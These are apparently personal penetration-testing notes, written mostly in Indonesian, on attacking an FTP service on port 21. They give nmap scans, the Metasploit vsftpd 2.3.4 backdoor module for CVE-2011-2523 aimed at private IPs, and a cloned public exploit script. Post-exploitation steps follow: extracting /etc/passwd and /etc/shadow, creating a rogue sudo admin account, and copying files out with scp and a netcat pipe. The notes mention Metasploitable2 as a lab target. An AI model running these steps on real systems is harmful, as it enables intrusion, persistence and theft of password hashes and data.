---
title: Port 21 - FTP
updated: 2025-12-16 12:00:20Z
created: 2025-12-16 10:42:30Z
latitude: -6.20239360
longitude: 106.65270990
altitude: 0.0000
---

Scan Target  
nmap -sV -p- 192.168.103.4

nmap -sV 192.168.101.194

Jalankan Metasploit Framework, Load Payload, Set Target IP dan Run  
msfconsole  
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 192.168.103.4  
run

Post Exploitation  
extract  
/etc/passwd  
/etc/shadow  
buat userbaru - dengan nama admin  
 useradd / adduser  
passwd

usermod -aG sudo user

pindahkan data tersebut ke pc kita...

scp -r lokasi_file user@ip:lokasi_file  
scp -r admin@192.168.101.238:/home/admin/data ~/Downloads/

Target  
nc -lvnp 4444 < /etc/passwd

Penyerang  
nc ip_target 4444

\[untuk cari index vuln\]  
cve.org

* * *

**Cara Lain**

CVE-2011-2523 - vsftpd 2.3.4 Exploit

### Requirements

sudo apt update  
sudo apt install python3  
sudo apt install python3-pip  
pip install argparse

### Installation

git clone https://github.com/Lynk4/CVE-2011-2523.git  
cd ./CVE-2011-2523  
chmod +x exploit.py

### Usage

python3 exploit.py -host Target_IP

![b8b7bbd95dbe92103ad670afa49f0f75.png](../../../_resources/b8b7bbd95dbe92103ad670afa49f0f75-2.png)

### Test

You can test the exploit on <ins>Metasploitable2</ins>